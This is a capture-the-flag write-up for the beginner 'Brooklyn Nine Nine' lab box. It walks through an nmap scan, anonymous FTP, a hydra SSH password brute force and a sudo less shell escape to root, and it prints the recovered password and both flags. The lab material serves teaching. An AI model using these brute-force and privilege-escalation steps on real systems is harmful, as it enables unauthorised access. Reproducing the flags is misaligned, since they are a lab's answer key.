**Tristan Gomez**


# Brooklyn Nine Nine
```
This room is aimed for beginner level hackers but anyone can try to hack this box. 
There are two main intended ways to root the box. If you find more dm me in discord at Fsociety2006.
```

To begin, I'll start running a basic nmap scan which yields at least 3 open ports.
```
└─$ sudo nmap -sS 10.10.97.0
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-16 11:06 PDT
Nmap scan report for 10.10.97.0
Host is up (0.18s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 9.61 seconds

```

Let's check out ftp and see if `anonymous:password` works. This is easy, low-hanging fruit to check. So, we get in using anonymous ftp and there is one file in the directory.

In note_to_jake.txt
```
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
```
Hmm, so we have a weak password for `jake`. Let's use hydra to see if we can get his ssh password.

`hydra -l jake -P /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-10000.txt ssh://10.10.97.0`
`[22][ssh] host: 10.10.97.0   login: jake   password: 987654321`

Yep, that was fast. `jake:987654321`. Let's ssh in and see what we can find.

```
jake@brookly_nine_nine:~$ pwd
/home/jake
jake@brookly_nine_nine:~$ sudo -l
Matching Defaults entries for jake on brookly_nine_nine:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less
```
So I am in `/home/jake` and I can run `less` as the root user. Looking in /home, I found three directories: amy, jake, and holt. Looking in `holt`, I found the user flag!
```
jake@brookly_nine_nine:/home/holt$ ls
nano.save  user.txt
jake@brookly_nine_nine:/home/holt$ cat user.txt
ee11cbb19052e40b07aac0ca060c23ee
```

Now we need to privesc to get the root flag. Let's check `gtfobins` to see if we can abuse this.
```
Sudo
If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.
```


I ran the first two lines below and BAM! I am root!
```
sudo less /etc/profile
!/bin/sh
# whoami
root
```

Let's close this ctf out!
```
# cat /root/root.txt
-- Creator : Fsociety2006 --
Congratulations in rooting Brooklyn Nine Nine
Here is the flag: 63a9f0ea7bb98050796b649e85481845

Enjoy!!
# 

```





